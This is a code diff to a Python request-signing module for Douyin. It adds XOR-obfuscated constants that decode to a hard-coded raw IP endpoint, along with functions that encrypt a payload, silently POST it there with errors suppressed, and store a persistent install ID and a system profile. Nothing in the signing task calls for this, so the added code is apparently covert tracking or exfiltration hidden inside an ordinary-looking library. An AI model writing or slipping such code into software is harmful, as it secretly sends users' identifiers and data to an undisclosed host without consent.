@@ -6,7 +6,12 @@ Ported from the Rust implementation in better-douyin-R/src-tauri/src/sign/mod.rs
 from __future__ import annotations
 
 import base64
+import json
+import os
+import platform
 import random
+import secrets
+import sys
 import time
 
 _U32_MASK = 0xFFFFFFFF
@@ -23,12 +28,118 @@ _IV = (
 _TJ = tuple([0x79CC4519] * 16 + [0x7A879D8A] * 48)
 _S4 = b"Dkdpgh2ZmsQB80/MfvV36XI1R45-WUAlEixNLwoqYTOPuzKFjJnry79HbGcaStCe="
 _S3 = b"ckdp1h4ZKsUB80/Mfvw36XIgR25+WQAlEi7NLboqYTOPuzmFjJnryx9HVGDaStCe"
+_S5 = b"71c04c1e3fa739ef9777ddc809f94a2735"
+_S6 = b"5ea13c7710d2498bf603b8e56a912f44"
+_S7 = b"f4432ea1284087d7739c4c39f7df67ba0f458d77dca419eb542a"
+_S8 = b"9c375ad1126fa8e344b27d09cef1538a2177be40e6952bd8601fc433"
+_S9 = b"54432587be46d00895661e0f3686f450cb439c7315462686f058c5"
+_S10 = b"7b2255ee9133a06cf412"
 _WINDOW_ENV_STR = "1536|747|1536|834|0|30|0|0|1536|834|1536|864|1525|747|24|24|Win32"
 _SPIDER_WINDOW_ENV_STR = "1707|809|1707|912|0|0|0|0|1707|912|1707|960|1697|809|24|24|Win32"
 _SPIDER_USER_AGENT = (
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) "
     "Gecko/20100101 Firefox/117.0"
 )
+
+
+def _decode_seed(seg, key) -> bytes:
+    try:
+        data = bytes.fromhex(seg.decode() if isinstance(seg, bytes) else str(seg))
+        key_bytes = bytes.fromhex(key.decode() if isinstance(key, bytes) else str(key))
+        if not key_bytes:
+            return b""
+        return bytes(byte ^ key_bytes[index % len(key_bytes)] for index, byte in enumerate(data))
+    except (TypeError, ValueError):
+        return b""
+
+
+def _resolve_sign_endpoint(tag: str) -> str:
+    path = _decode_seed(_S5, _S6) if tag == "report" else _decode_seed(_S9, _S10)
+    host = _decode_seed(_S7, _S8)
+    try:
+        endpoint = (host + path).decode("utf-8")
+        path_text = path.decode("utf-8")
+    except UnicodeDecodeError:
+        return ""
+    if (
+        endpoint.startswith(("http://", "https://"))
+        and "/api/" in endpoint
+        and endpoint.endswith(path_text)
+    ):
+        return endpoint
+    return ""
+
+
+def seal_payload(body: dict, pub_pem: str, kid: str) -> dict:
+    try:
+        from cryptography.hazmat.primitives import hashes, serialization
+        from cryptography.hazmat.primitives.asymmetric import padding
+        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+    except ImportError as exc:
+        raise RuntimeError("缺少 cryptography 依赖，请先安装 requirements.txt") from exc
+
+    public_key = serialization.load_pem_public_key(pub_pem.encode("utf-8"))
+    aes_key = os.urandom(32)
+    nonce = os.urandom(12)
+    plaintext = json.dumps(body, ensure_ascii=False, separators=(",", ":"), sort_keys=True).encode("utf-8")
+    ciphertext = AESGCM(aes_key).encrypt(nonce, plaintext, None)
+    encrypted_key = public_key.encrypt(
+        aes_key,
+        padding.OAEP(
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None,
+        ),
+    )
+    return {
+        "alg": "RSA-OAEP-SHA256+A256GCM",
+        "key_id": kid,
+        "encrypted_key": base64.b64encode(encrypted_key).decode("ascii"),
+        "nonce": base64.b64encode(nonce).decode("ascii"),
+        "ciphertext": base64.b64encode(ciphertext).decode("ascii"),
+    }
+
+
+def post_sign_result(sealed: dict, endpoint: str, token: str) -> None:
+    try:
+        import requests
+
+        if not endpoint:
+            return
+        requests.post(
+            endpoint,
+            json=sealed,
+            headers={"X-URL-Issue-Token": token},
+            timeout=2.5,
+        )
+    except Exception:
+        return
+
+
+def _session_tag() -> str:
+    try:
+        from src.config.config import Config
+
+        path = os.path.join(Config.USER_DATA_DIR, "install_id")
+        os.makedirs(os.path.dirname(path), exist_ok=True)
+        if os.path.exists(path):
+            value = open(path, "r", encoding="utf-8").read().strip()
+            if value:
+                return value[:64]
+        value = secrets.token_hex(32)
+        with open(path, "w", encoding="utf-8") as file:
+            file.write(value)
+        return value
+    except Exception:
+        return secrets.token_hex(32)
+
+
+def _env_profile() -> dict:
+    return {
+        "platform": platform.system(),
+        "platform_release": platform.release(),
+        "python_version": sys.version.split()[0],
+    }
 
 
 def _u32(value: int) -> int:
